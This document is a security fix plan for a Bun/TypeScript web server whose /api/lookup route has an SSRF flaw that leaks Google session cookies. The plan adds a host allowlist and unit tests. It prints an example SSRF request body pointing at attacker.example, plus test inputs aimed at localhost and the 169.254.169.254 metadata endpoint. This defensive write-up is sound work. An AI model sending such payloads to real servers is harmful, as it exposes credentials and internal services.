# Plan 001: The web server only ever fetches Google URLs it builds itself

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md`.
>
> **Drift check (run first)**:
> `git diff --stat 4a3a843..HEAD -- packages/web/server.ts packages/web/browser.ts packages/web/histogram.ts packages/web/resolve.ts`
> If any of those files changed since this plan was written, compare the
> "Current state" excerpts below against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: S
- **Risk**: LOW
- **Depends on**: none
- **Category**: security
- **Planned at**: commit `4a3a843`, 2026-06-11

## Why this matters

`POST /api/lookup` accepts a user-pasted "Google Maps URL". For a normal (non
short-link) paste the server **does not validate the host** — it regex-extracts a
featureId and then fetches the *original URL* server-side to scrape the place
preview, attaching Google session cookies and routing through the residential
proxy. So a request body like
`{"url":"http://attacker.example/x?ftid=0x1:0x2"}` makes the server issue a
credentialed GET to `attacker.example`. That leaks the baked Google cookies
(`CONSENT`, `SOCS`, `__Secure-ENID`, `__Secure-BUCKET`) to an arbitrary host and
turns the server + proxy into a request relay. It is remotely triggerable with no
auth (CORS is irrelevant — the attacker reads the request on *their* server, not
via the HTTP response).

After this plan: the server only ever fetches URLs it constructs from a featureId
(`https://www.google.com/maps?q=&ftid=…`), and a host-allowlist guard inside the
single network primitive (`googleFetch`) rejects any non-Google host as
defense-in-depth. The user's pasted URL becomes display-only.

## Current state

Files involved:

- `packages/web/resolve.ts` — parses the pasted URL into `{ featureId, name, resolvedUrl }`. `resolvedUrl` is the user's URL (only short-links get redirect-followed; a normal paste passes through unchanged). **No host validation.**
- `packages/web/server.ts` — `/api/lookup` route + the stream builders that fetch the preview.
- `packages/web/histogram.ts` — `fetchPreviewBundle(placeUrl)` → calls `fetchPlacePreview`.
- `packages/web/browser.ts` — `googleFetch(url)` is the one network primitive (proxy + cookies + retry); `fetchPlacePreview(placeUrl)` is the SSRF sink.

The vulnerable data flow (verified):

`server.ts` `/api/lookup` POST (lines 307-319) →
```ts
const { url } = await req.json();
const { featureId, name, resolvedUrl } = await resolvePlace(url);
const cached = cache.get(featureId);
if (cached) return streamCachedLookup(featureId, name, resolvedUrl, cached);
return streamFreshLookup(featureId, name, resolvedUrl);   // cache MISS
```

`streamFreshLookup` (lines 257-289) calls, with the user-controlled `resolvedUrl`:
```ts
const previewPromise = getOrFetchPreviewBundle(featureId, resolvedUrl)  // line 265
```

`getOrFetchPreviewBundle` (lines 291-301):
```ts
function getOrFetchPreviewBundle(featureId: string, url: string): Promise<PreviewBundle> {
  const existing = cache.get(featureId);
  if (existing?.histogram && existing.meta && cache.histogramFresh(existing)) {
    return Promise.resolve({ histogram: existing.histogram, meta: existing.meta });
  }
  return previewInflight.run(featureId, async () => {
    const bundle = await fetchPreviewBundle(url);   // <-- fetches user URL
    await cache.putPreviewBundle(featureId, bundle);
    return bundle;
  });
}
```

`histogram.ts` (lines 8-11):
```ts
export async function fetchPreviewBundle(placeUrl: string): Promise<PreviewBundle> {
  const data = await fetchPlacePreview(placeUrl);
  return { histogram: histogramFromPreview(data), meta: metaFromPreview(data) };
}
```

`browser.ts` `fetchPlacePreview` (lines 108-118) → `googleFetch(placeUrl)` (lines 78-106), which does:
```ts
r = await fetch(url, { proxy: PROXY_URL, headers: { ...FETCH_HEADERS_BASE, Cookie: cookie } });
```
`cookie` is the baked Google cookie header. **This is the sink.**

The canonical Google URL helper already exists in `server.ts` (line 62):
```ts
const mapsUrlFor = (featureId: string) => `https://www.google.com/maps?q=&ftid=${featureId}`;
```
The highlights path already uses `mapsUrlFor(featureId)` for its preview scrape on
purpose (see the comment at `server.ts:100-104`: the bare ftid URL avoids Google
A/B buckets that drop the chip slot) — so switching the histogram preview to the
same canonical URL is consistent and, if anything, more reliable.

Other call sites of `getOrFetchPreviewBundle` (both already pass cached/derived URLs, but will be simplified to use the featureId for consistency):
- `revalidate` (line 132): `getOrFetchPreviewBundle(featureId, resolvedUrl).catch(...)`
- `/api/histogram` route (line 383): `getOrFetchPreviewBundle(featureId, url)` where `url = entry.resolvedUrl ?? mapsUrlFor(featureId)`

Conventions to match: this package is plain Bun + TypeScript, no framework. Errors
thrown inside a route are caught and returned via `json(errBody(e), 400)` (see
`server.ts:315-318`). Tests use `bun:test` (`import { test, expect } from 'bun:test'`)
— see `packages/web/inflight.test.ts` for the exact structural pattern.

## Commands you will need

| Purpose | Command | Expected on success |
|---|---|---|
| Run web tests | `bun test packages/web/` | all pass |
| Run this plan's new test | `bun test packages/web/browser.test.ts` | all pass |
| Start server locally (optional smoke) | `bun --cwd packages/web run dev` | logs `http://localhost:3000` |

(There is no working `tsc` gate for `packages/web` yet — that is plan 002. Do not
rely on `tsc` here; use `bun test`.)

## Scope

**In scope** (the only files you should modify):
- `packages/web/browser.ts` — add the host-allowlist guard, call it in `googleFetch`, export the guard for testing.
- `packages/web/browser.test.ts` — **create**; unit-tests the guard.
- `packages/web/server.ts` — make `getOrFetchPreviewBundle` build its own Google URL from the featureId; update its three call sites.

**Out of scope** (do NOT touch):
- `packages/web/resolve.ts` — leave `resolvedUrl` as-is; it stays as the display
  URL the client links to. The short-link HEAD-follow in `resolvePlace` (lines
  20-28) only ever issues an un-credentialed `HEAD` against `*.goo.gl` and is not
  the sink; do not change it.
- The wire contract, the cache, the client. `resolvedUrl` must still be returned
  to the client (it is used for the place hyperlink) — only the **server-side
  fetch** of it goes away.

## Git workflow

- Branch: `advisor/001-close-lookup-ssrf`
- Commit message style matches the repo (short, scope-prefixed — e.g. `web: …`).
  Example from `git log`: `web: collapse three inflight-request coalescers into one tested module`.
- Do NOT push or open a PR unless the operator instructs it.

## Steps

### Step 1: Add a Google-host allowlist guard and enforce it in `googleFetch`

In `packages/web/browser.ts`, add an exported guard and call it at the very top of
`googleFetch` (before the cookie bake / fetch). Place the function just above
`googleFetch` (above line 78).

Target shape:
```ts
// The server must only ever fetch Google's own hosts. Everything legitimately
// passed here (listugcposts, preview/place, the maps HTML) is *.google.com; an
// attacker-supplied place URL is the one thing that isn't. Reject by hostname
// SUFFIX — a substring check would wrongly admit "google.com.attacker.example".
export function assertGoogleHost(url: string): void {
  let host: string;
  try {
    host = new URL(url).hostname.toLowerCase();
  } catch {
    throw new Error('invalid URL');
  }
  if (host !== 'google.com' && !host.endsWith('.google.com')) {
    throw new Error(`refusing to fetch non-Google host: ${host}`);
  }
}
```

Then, as the first statement inside `export async function googleFetch(url: string)`
(currently line 78, before `const cookie = await getGoogleCookieHeader();`):
```ts
assertGoogleHost(url);
```

Leave `bakeCookies()` (which fetches the fixed literal `https://www.google.com/maps?hl=en`)
unchanged — it does not go through `googleFetch`, and its URL is a constant.

**Verify**: `bun test packages/web/browser.test.ts` — fails right now because the
test file does not exist yet; you will create it in Step 2. For now just confirm
the file still parses by starting the server: `bun --cwd packages/web run dev`
should still log `http://localhost:3000` (Ctrl-C to stop). If it crashes on
startup, you introduced a syntax error — fix before continuing.

### Step 2: Unit-test the guard

Create `packages/web/browser.test.ts`, modeled structurally on
`packages/web/inflight.test.ts` (same `bun:test` imports, same `describe`/`test`
layout):
```ts
import { test, expect, describe } from 'bun:test';
import { assertGoogleHost } from './browser';

describe('assertGoogleHost', () => {
  test('allows google.com and its subdomains', () => {
    expect(() => assertGoogleHost('https://www.google.com/maps/rpc/listugcposts?x=1')).not.toThrow();
    expect(() => assertGoogleHost('https://google.com/maps?q=&ftid=0x1:0x2')).not.toThrow();
    expect(() => assertGoogleHost('https://maps.google.com/anything')).not.toThrow();
  });

  test('rejects non-Google hosts', () => {
    expect(() => assertGoogleHost('http://attacker.example/x?ftid=0x1:0x2')).toThrow();
    expect(() => assertGoogleHost('http://localhost:3000/')).toThrow();
    expect(() => assertGoogleHost('http://169.254.169.254/latest/meta-data/')).toThrow();
  });

  test('rejects look-alike hosts that only contain "google.com" as a substring', () => {
    expect(() => assertGoogleHost('https://google.com.attacker.example/x')).toThrow();
    expect(() => assertGoogleHost('https://notgoogle.com/x')).toThrow();
    expect(() => assertGoogleHost('https://evilgoogle.com/x')).toThrow();
  });

  test('rejects a malformed URL', () => {
    expect(() => assertGoogleHost('not a url')).toThrow();
  });
});
```

**Verify**: `bun test packages/web/browser.test.ts` → all 4 tests pass.

### Step 3: Make `getOrFetchPreviewBundle` build its own Google URL

In `packages/web/server.ts`, change `getOrFetchPreviewBundle` so it ignores any
caller-supplied URL and fetches the canonical `mapsUrlFor(featureId)` instead.
This removes the user URL from the fetch path entirely (the Step-1 guard is the
backstop; this is the primary fix).

Change the signature and body (lines 291-301) to:
```ts
function getOrFetchPreviewBundle(featureId: string): Promise<PreviewBundle> {
  const existing = cache.get(featureId);
  if (existing?.histogram && existing.meta && cache.histogramFresh(existing)) {
    return Promise.resolve({ histogram: existing.histogram, meta: existing.meta });
  }
  return previewInflight.run(featureId, async () => {
    const bundle = await fetchPreviewBundle(mapsUrlFor(featureId));
    await cache.putPreviewBundle(featureId, bundle);
    return bundle;
  });
}
```

Update the three call sites to drop the second argument:
- `streamFreshLookup`, line 265: `getOrFetchPreviewBundle(featureId, resolvedUrl)` → `getOrFetchPreviewBundle(featureId)`
- `revalidate`, line 132: `getOrFetchPreviewBundle(featureId, resolvedUrl).catch(() => null)` → `getOrFetchPreviewBundle(featureId).catch(() => null)`
- `/api/histogram` route, lines 382-383:
  ```ts
  const url = entry.resolvedUrl ?? mapsUrlFor(featureId);
  const { histogram } = await getOrFetchPreviewBundle(featureId, url);
  ```
  → delete the now-unused `url` line and call `getOrFetchPreviewBundle(featureId)`.

After this, `resolvedUrl` is still threaded into `streamFreshLookup`/`revalidate`
for the events/cache (the client link) — just no longer fetched. Do not remove the
`resolvedUrl` parameters from those functions.

**Verify**:
- `bun test packages/web/` → all pass (no regressions).
- `grep -n "getOrFetchPreviewBundle(featureId," packages/web/server.ts` → **no
  matches** (every call now takes only the featureId).
- `grep -n "fetchPreviewBundle\|getOrFetchPreviewBundle" packages/web/server.ts` →
  confirm the only argument flowing into a fetch is featureId-derived.

### Step 4 (optional sanity, only if a proxy/cookies setup is available): live smoke

If — and only if — `packages/web/.env` is configured with a working proxy and you
can run the server, do a manual check; otherwise SKIP (the deploy pipeline's smoke
test covers the happy path):
```sh
bun --cwd packages/web run dev   # in one shell
# in another shell:
curl -s -X POST http://localhost:3000/api/lookup -H 'Content-Type: application/json' \
  -d '{"url":"http://attacker.example/x?ftid=0x47e66e2964e34e2d:0x8ddca9ee380ef7e0"}'
```
Expected: a JSON error or a stream that scores the place from Google **without any
request to `attacker.example`** (the guard/redirect means attacker.example is
never contacted). Do NOT treat a non-empty score as failure — the featureId is a
real one (Eiffel Tower); the point is that the *host in the body* is ignored.

## Test plan

- New file `packages/web/browser.test.ts` with the 4 `assertGoogleHost` cases in
  Step 2 (allow, reject, look-alike-substring, malformed). The look-alike case is
  the security-critical one — it proves the guard uses a suffix check, not
  `includes('google.com')`.
- Pattern to follow: `packages/web/inflight.test.ts`.
- Verification: `bun test packages/web/` → all pass, including the 4 new tests.

## Done criteria

ALL must hold:

- [ ] `bun test packages/web/` exits 0; `packages/web/browser.test.ts` exists with ≥4 passing tests.
- [ ] `assertGoogleHost` is called as the first statement of `googleFetch` in `packages/web/browser.ts`.
- [ ] `grep -n "getOrFetchPreviewBundle(featureId," packages/web/server.ts` returns no matches.
- [ ] `resolvedUrl` is still passed to the client (the `lookup`/`place`/`refreshed` events still carry it — unchanged from before).
- [ ] No files outside the in-scope list are modified (`git status`).
- [ ] `plans/README.md` status row for 001 updated.

## STOP conditions

Stop and report back (do not improvise) if:

- The "Current state" excerpts don't match the live code (drift since `4a3a843`).
- `mapsUrlFor(featureId)` turns out NOT to yield a usable preview (e.g. the new
  test place returns an empty histogram where the old path did not). If a live
  smoke shows the histogram regressed, STOP — the fix may need to keep fetching a
  Google-host-validated `resolvedUrl` instead of switching to `mapsUrlFor`. Report
  what you observed.
- Removing the `url` parameter breaks a call site you didn't expect (run
  `grep -rn "getOrFetchPreviewBundle" packages/web/` first to confirm there are
  exactly the three call sites listed above; if there are more, STOP and report).

## Maintenance notes

- The invariant to preserve in review: **`googleFetch` must only ever receive a
  URL the server constructed.** If a future feature wants to fetch a
  user-influenced URL, it must pass through `assertGoogleHost` (or be built from a
  featureId). The guard is the backstop; keep it.
- `resolvedUrl` is now strictly a display value. If anyone later re-introduces a
  server-side fetch of it, that re-opens this vuln — flag it.
- Deferred out of scope: rotating the baked Google cookies is unnecessary (they're
  not secrets, just consent seeds), but the *Gemini* key exposure is a separate
  real issue handled in plan 004.
